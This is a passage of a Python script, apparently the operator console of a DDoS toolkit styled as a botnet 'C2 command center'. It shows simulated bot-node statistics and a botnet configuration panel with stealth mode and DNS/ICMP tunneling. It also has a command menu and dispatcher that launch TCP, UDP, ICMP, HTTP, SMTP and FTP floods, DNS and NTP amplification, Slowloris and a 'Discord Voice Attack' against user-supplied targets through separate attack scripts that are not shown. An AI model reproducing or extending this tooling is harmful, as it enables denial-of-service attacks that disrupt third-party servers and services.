    print(f"{GRAY}|-{RESET} {GRAY}Germany{RESET}: {RED}134{RESET} nodes ({GRAY}10.7%{RESET})")
    print(f"{GRAY}|-{RESET} {GRAY}Other{RESET}: {GRAY}130{RESET} nodes ({GRAY}10.4%{RESET})")
    print()

    print(f"{RED}[NODE TYPES]{RESET}")
    print(f"{GRAY}|-{RESET} {GRAY}IoT Devices{RESET}: {RED}567{RESET} nodes ({GRAY}45.5%{RESET})")
    print(f"{GRAY}|-{RESET} {GRAY}Servers{RESET}: {RED}312{RESET} nodes ({GRAY}25.0%{RESET})")
    print(f"{GRAY}|-{RESET} {GRAY}Workstations{RESET}: {RED}234{RESET} nodes ({GRAY}18.8%{RESET})")
    print(f"{GRAY}|-{RESET} {GRAY}Routers{RESET}: {RED}89{RESET} nodes ({GRAY}7.1%{RESET})")
    print(f"{GRAY}|-{RESET} {GRAY}Mobile{RESET}: {GRAY}45{RESET} nodes ({GRAY}3.6%{RESET})")
    print()

    print(f"{RED}[NETWORK CAPACITY]{RESET}")
    print(f"{GRAY}|-{RESET} Total Bandwidth: {GRAY}2.4 TB/s{RESET}")
    print(f"{GRAY}|-{RESET} Available: {RED}1.8 TB/s{RESET}")
    print(f"{GRAY}|-{RESET} In Use: {GRAY}0.6 TB/s{RESET}")
    print(f"{GRAY}|-{RESET} Average Latency: {GRAY}23ms{RESET}")
    print()

    print(f"{RED}[RECENTLY CONNECTED NODES]{RESET}")
    print(f"{GRAY}|-{RESET} [{GRAY}14:35:18{RESET}] {RED}BOT-1247{RESET} - {GRAY}192.168.1.247{RESET} (USA - Server)")
    print(f"{GRAY}|-{RESET} [{GRAY}14:35:15{RESET}] {RED}BOT-1246{RESET} - {GRAY}45.33.32.156{RESET} (China - IoT)")
    print(f"{GRAY}|-{RESET} [{GRAY}14:35:12{RESET}] {RED}BOT-1245{RESET} - {GRAY}178.62.33.98{RESET} (Russia - Router)")
    print(f"{GRAY}|-{RESET} [{GRAY}14:35:09{RESET}] {RED}BOT-1244{RESET} - {GRAY}139.59.1.89{RESET} (Brazil - Workstation)")
    print()

    input(f"{RED}[C2]{RESET} Press Enter to return...")

def bot_configuration():
    """Display botnet configuration options"""
    clear_screen()
    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    print(f"{RED}+{'='*78}+{RESET}")
    print(f"{RED}|{RESET} {RED}BOTNET CONFIGURATION PANEL{RESET} {GRAY}| Access Level: {GRAY}ADMINISTRATOR{RESET}                 {RED}|{RESET}")
    print(f"{RED}+{'='*78}+{RESET}")
    print()

    print(f"{RED}[GLOBAL SETTINGS]{RESET}")
    print(f"{GRAY}|-{RESET} Max Concurrent Attacks: {GRAY}5{RESET}")
    print(f"{GRAY}|-{RESET} Default Attack Duration: {GRAY}300s{RESET}")
    print(f"{GRAY}|-{RESET} Node Timeout: {GRAY}30s{RESET}")
    print(f"{GRAY}|-{RESET} Auto-Heal: {RED}ENABLED{RESET}")
    print(f"{GRAY}|-{RESET} Stealth Mode: {RED}ENABLED{RESET}")
    print()

    print(f"{RED}[COMMUNICATION PROTOCOLS]{RESET}")
    print(f"{GRAY}|-{RESET} Primary: {GRAY}HTTPS (Port 443){RESET}")
    print(f"{GRAY}|-{RESET} Backup: {GRAY}DNS Tunneling{RESET}")
    print(f"{GRAY}|-{RESET} Fallback: {GRAY}ICMP Tunneling{RESET}")
    print(f"{GRAY}|-{RESET} Encryption: {GRAY}AES-256-GCM{RESET}")
    print()

    print(f"{RED}[COMMAND QUEUE]{RESET}")
    print(f"{GRAY}|-{RESET} Pending: {GRAY}12{RESET} commands")
    print(f"{GRAY}|-{RESET} Executing: {RED}3{RESET} commands")
    print(f"{GRAY}|-{RESET} Completed: {GRAY}1,247{RESET} commands")
    print(f"{GRAY}|-{RESET} Failed: {GRAY}23{RESET} commands")
    print()

    print(f"{RED}[SECURITY MEASURES]{RESET}")
    print(f"{GRAY}|-{RESET} 2FA: {RED}ENABLED{RESET}")
    print(f"{GRAY}|-{RESET} IP Whitelist: {GRAY}3 addresses{RESET}")
    print(f"{GRAY}|-{RESET} Rate Limiting: {RED}ENABLED{RESET}")
    print(f"{GRAY}|-{RESET} DDoS Protection: {RED}ACTIVE{RESET}")
    print(f"{GRAY}|-{RESET} Kill Switch: {GRAY}ARMED{RESET}")
    print()

    input(f"{RED}[C2]{RESET} Press Enter to return...")

def install_dependencies():
    clear_screen()
    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    print(f"{RED}+{'='*78}+{RESET}")
    print(f"{RED}|{RESET} {RED}SYSTEM DEPENDENCY INSTALLATION{RESET}                                    {RED}|{RESET}")
    print(f"{RED}+{'='*78}+{RESET}")
    print()
    print(f"{RED}[C2]{RESET} {GRAY}Installing required packages...{RESET}")
    print()

    animated_loader("Checking package manager", 1)
    animated_loader("Downloading packages", 1.5)
    animated_loader("Installing dependencies", 2)

    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "requests", "dnspython"])
        print()
        print(f"{RED}[SUCCESS]{RESET} {GRAY}All dependencies installed successfully!{RESET}")
    except Exception as e:
        print()
        print(f"{RED}[ERROR]{RESET} {e}")

    input(f"{RED}[C2]{RESET} Press Enter to return...")

def print_help():
    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    print(f"{RED}{'█'*78}{RESET}")
    print(f"{RED}█{RESET} {RED}NETWORK TOOLKIT COMMANDS{RESET} {RESET}{' '*46}{RED}█{RESET}")
    print(f"{RED}{'█'*78}{RESET}")
    print()
    print(f"{RED}[LAYER 4 ATTACKS]{RESET}")
    print(f"{GRAY}!TCP <ip> <port> <duration> <requests>{RESET}     {GRAY}TCP SYN Flood{RESET}")
    print(f"{GRAY}!UDP <ip> <port> <duration> <requests>{RESET}     {GRAY}UDP Flood{RESET}")
    print(f"{GRAY}!ICMP <ip> <duration> <requests>{RESET}           {GRAY}ICMP Flood{RESET}")
    print(f"{GRAY}!CONN <ip> <port> <duration> <requests>{RESET}    {GRAY}TCP Connection Flood{RESET}")
    print()
    print(f"{RED}[LAYER 7 ATTACKS]{RESET}")
    print(f"{GRAY}!HTTP <url> <duration> <requests>{RESET}         {GRAY}HTTP Flood{RESET}")
    print(f"{GRAY}!DNS <dns_server> <duration> <requests>{RESET}    {GRAY}DNS Amplification{RESET}")
    print(f"{GRAY}!SMTP <ip> <port> <duration> <requests>{RESET}    {GRAY}SMTP Flood{RESET}")
    print(f"{GRAY}!FTP <ip> <port> <duration> <requests>{RESET}     {GRAY}FTP Flood{RESET}")
    print(f"{GRAY}!NTP <ntp_servers> <duration> <requests>{RESET}    {GRAY}NTP Amplification{RESET}")
    print(f"{GRAY}!SLOW <ip> <port> <duration> <requests>{RESET}    {GRAY}Slowloris Attack{RESET}")
    print(f"{GRAY}!VOICE <ip> <port> <duration> <threads> <packets>{RESET} {GRAY}Discord Voice Attack{RESET}")
    print()
    print(f"{RED}[UTILITY]{RESET}")
    print(f"{GRAY}!HELP{RESET}                                        {GRAY}Show this menu{RESET}")
    print(f"{GRAY}!CLEAR{RESET}                                       {GRAY}Clear terminal{RESET}")
    print(f"{GRAY}!EXIT{RESET}                                        {GRAY}Exit toolkit{RESET}")
    print()
    print(f"{RED}[EXAMPLES]{RESET}")
    print(f"{GRAY}!TCP 192.168.1.1 80 30 1000{RESET}")
    print(f"{GRAY}!UDP 192.168.1.1 53 30 1000{RESET}")
    print(f"{GRAY}!HTTP http://example.com 30 1000{RESET}")
    print(f"{GRAY}!VOICE 104.29.145.248 19298 30 50 1000{RESET}")
    print()

def parse_command(cmd):
    parts = cmd.split()
    if not parts:
        return None, []

    command = parts[0].upper()
    args = parts[1:]
    return command, args

def execute_command(command, args):
    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    if command == '!HELP':
        print_help()

    elif command == '!CLEAR':
        clear_screen()

    elif command == '!EXIT':
        print(f"{RED}[EXIT]{RESET} {GRAY}Exiting toolkit...{RESET}")
        sys.exit(0)

    elif command == '!TCP':
        if len(args) < 4:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !TCP <ip> <port> <duration> <requests>{RESET}")
            return
        ip, port, duration, requests = args[0], args[1], args[2], args[3]
        print(f"{RED}[TCP]{RESET} {GRAY}Starting TCP SYN Flood on {ip}:{port}{RESET}")
        run_tool_with_args('layer4/tcp_scanner.py', ip, port, duration, requests)

    elif command == '!UDP':
        if len(args) < 4:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !UDP <ip> <port> <duration> <requests>{RESET}")
            return
        ip, port, duration, requests = args[0], args[1], args[2], args[3]
        print(f"{RED}[UDP]{RESET} {GRAY}Starting UDP Flood on {ip}:{port}{RESET}")
        run_tool_with_args('layer4/udp_scanner.py', ip, port, duration, requests)

    elif command == '!ICMP':
        if len(args) < 3:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !ICMP <ip> <duration> <requests>{RESET}")
            return
        ip, duration, requests = args[0], args[1], args[2]
        print(f"{RED}[ICMP]{RESET} {GRAY}Starting ICMP Flood on {ip}{RESET}")
        run_tool_with_args('layer4/icmp_toolkit.py', ip, duration, requests)

    elif command == '!CONN':
        if len(args) < 4:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !CONN <ip> <port> <duration> <requests>{RESET}")
            return
        ip, port, duration, requests = args[0], args[1], args[2], args[3]
        print(f"{RED}[CONN]{RESET} {GRAY}Starting TCP Connection Flood on {ip}:{port}{RESET}")
        run_tool_with_args('layer4/connection_tester.py', ip, port, duration, requests)

    elif command == '!HTTP':
        if len(args) < 3:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !HTTP <url> <duration> <requests>{RESET}")
            return
        url, duration, requests = args[0], args[1], args[2]
        print(f"{RED}[HTTP]{RESET} {GRAY}Starting HTTP Flood on {url}{RESET}")
        run_tool_with_args('layer7/http_toolkit.py', url, duration, requests)

    elif command == '!DNS':
        if len(args) < 3:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !DNS <dns_server> <duration> <requests>{RESET}")
            return
        dns_server, duration, requests = args[0], args[1], args[2]
        print(f"{RED}[DNS]{RESET} {GRAY}Starting DNS Amplification on {dns_server}{RESET}")
        run_tool_with_args('layer7/dns_toolkit.py', dns_server, duration, requests)

    elif command == '!SMTP':
        if len(args) < 4:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !SMTP <ip> <port> <duration> <requests>{RESET}")
            return
        ip, port, duration, requests = args[0], args[1], args[2], args[3]
        print(f"{RED}[SMTP]{RESET} {GRAY}Starting SMTP Flood on {ip}:{port}{RESET}")
        run_tool_with_args('layer7/smtp_toolkit.py', ip, port, duration, requests)

    elif command == '!FTP':
        if len(args) < 4:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !FTP <ip> <port> <duration> <requests>{RESET}")
            return
        ip, port, duration, requests = args[0], args[1], args[2], args[3]
        print(f"{RED}[FTP]{RESET} {GRAY}Starting FTP Flood on {ip}:{port}{RESET}")
        run_tool_with_args('layer7/ftp_toolkit.py', ip, port, duration, requests)

    elif command == '!NTP':
        if len(args) < 3:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !NTP <ntp_servers> <duration> <requests>{RESET}")
            return
        ntp_servers, duration, requests = args[0], args[1], args[2]
        print(f"{RED}[NTP]{RESET} {GRAY}Starting NTP Amplification on {ntp_servers}{RESET}")
        run_tool_with_args('layer7/ntp_toolkit.py', ntp_servers, duration, requests)

    elif command == '!SLOW':
        if len(args) < 4:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !SLOW <ip> <port> <duration> <requests>{RESET}")
            return
        ip, port, duration, requests = args[0], args[1], args[2], args[3]
        print(f"{RED}[SLOW]{RESET} {GRAY}Starting Slowloris Attack on {ip}:{port}{RESET}")
        run_tool_with_args('layer7/slowloris_toolkit.py', ip, port, duration, requests)

    elif command == '!VOICE':
        if len(args) < 5:
            print(f"{RED}[ERROR]{RESET} {GRAY}Usage: !VOICE <ip> <port> <duration> <threads> <packets>{RESET}")
            return
        ip, port, duration, threads, packets = args[0], args[1], args[2], args[3], args[4]
        print(f"{RED}[VOICE]{RESET} {GRAY}Starting Discord Voice Attack on {ip}:{port}{RESET}")
        run_tool_with_args('layer7/discord_toolkit.py', 'attack', ip, port, duration, threads, packets)

    else:
        print(f"{RED}[ERROR]{RESET} {GRAY}Unknown command. Type !HELP for available commands.{RESET}")

def c2_menu():
    """Main C2 menu with numbered options"""
    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    while True:
        clear_screen()
        print_banner()

        print(f"{RED}+{'='*78}+{RESET}")
        print(f"{RED}|{RESET} {RED}C2 COMMAND CENTER{RESET} {GRAY}| Status: {GRAY}ONLINE{RESET} {GRAY}| Nodes: {GRAY}1,247{RESET} {GRAY}|                 {RED}|{RESET}")
        print(f"{RED}+{'='*78}+{RESET}")
        print()

        print(f"{RED}[LAYER 4 TOOLS]{RESET}")
        print(f"{GRAY}|-{RESET} 1 - TCP SYN Flood")
        print(f"{GRAY}|-{RESET} 2 - UDP Flood")
        print(f"{GRAY}|-{RESET} 3 - ICMP Flood")
        print(f"{GRAY}|-{RESET} 4 - TCP Connection Flood")
        print()

        print(f"{RED}[LAYER 7 TOOLS]{RESET}")
        print(f"{GRAY}|-{RESET} 5 - HTTP Flood")
        print(f"{GRAY}|-{RESET} 6 - DNS Amplification")
        print(f"{GRAY}|-{RESET} 7 - SMTP Flood")
        print(f"{GRAY}|-{RESET} 8 - FTP Flood")
        print(f"{GRAY}|-{RESET} 9 - NTP Amplification")
        print(f"{GRAY}|-{RESET} 10 - Slowloris Attack")
        print(f"{GRAY}|-{RESET} 11 - Discord Voice Toolkit")
        print()

        print(f"{RED}[DDOS CONTROL]{RESET}")
        print(f"{GRAY}|-{RESET} 12 - Attack Control Panel")
        print()

        print(f"{RED}[SYSTEM]{RESET}")
        print(f"{GRAY}|-{RESET} 13 - Node Statistics")
        print(f"{GRAY}|-{RESET} 14 - Bot Configuration")
        print(f"{GRAY}|-{RESET} 15 - Install Dependencies")
        print(f"{GRAY}|-{RESET} 16 - Exit")
        print()

        choice = input(f"{RED}[C2 COMMAND]{RESET} ").strip()
        navigate_tree(choice)

def main():
    RED = '\033[91m'
    GRAY = '\033[90m'
    RESET = '\033[0m'

    clear_screen()
    print(f"{RED}[NETWORK TOOLKIT]{RESET}")
    print(f"{GRAY}Type !HELP for available commands or press Enter for menu mode{RESET}")
    print()

    first_input = input(f"{RED}>{RESET} ").strip()

    if not first_input:
        c2_menu()
    else:
        command, args = parse_command(first_input)
        if command:
            execute_command(command, args)

    while True:
        try:
            cmd = input(f"{RED}>{RESET} ").strip()
            if cmd:
                command, args = parse_command(cmd)
                if command:
                    execute_command(command, args)
        except KeyboardInterrupt:
            print(f"\n{RED}[INTERRUPT]{RESET} {GRAY}Type !EXIT to quit{RESET}")
        except Exception as e:
            print(f"{RED}[ERROR]{RESET} {GRAY}{e}{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        sys.exit(0)
